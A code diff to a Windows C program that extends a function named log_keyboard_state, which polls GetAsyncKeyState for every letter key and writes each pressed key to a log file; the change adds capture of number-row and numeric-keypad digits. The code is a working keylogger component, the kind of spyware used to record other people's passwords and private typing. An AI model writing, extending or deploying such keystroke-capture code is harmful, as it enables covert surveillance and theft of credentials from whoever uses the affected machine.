@@ -71,8 +71,9 @@ void log_keyboard_state( FILE * log_file )
 		int is_cap = ( key_shift == KEY_DOWN_STATE ? 1 : 0 ) ^ key_caps_lock;
 
 		// Check the state of the keys
+		// Alphabetic keys
 		int i;
-		for( i=65; i<90; i++ )
+		for( i = VK_A; i <= VK_Z; i++ )
 		{
 			if( GetAsyncKeyState( i ) & KEY_PRESSED_STATE )
 			{
@@ -81,6 +82,26 @@ void log_keyboard_state( FILE * log_file )
 				log_infos( log_file, "Keystroke : %c\n", ascii );
 			}
 		}
+		
+		// Numeric keys
+		for( i = VK_0; i <= VK_9; i++ )
+		{
+			if( GetAsyncKeyState( i ) & KEY_PRESSED_STATE )
+			{
+				log_infos( log_file, "Keystroke : %01d\n", i - VK_0 );
+			}
+		}
+		
+		for( i = VK_NUMPAD0; i <= VK_NUMPAD9; i++ )
+		{
+			if( GetAsyncKeyState( i ) & KEY_PRESSED_STATE )
+			{
+				log_infos( log_file, "Keystroke : %01d\n", i - VK_NUMPAD0 );
+			}
+		}
+		
+		// Text modifier keys
+		
 	}
 }
 
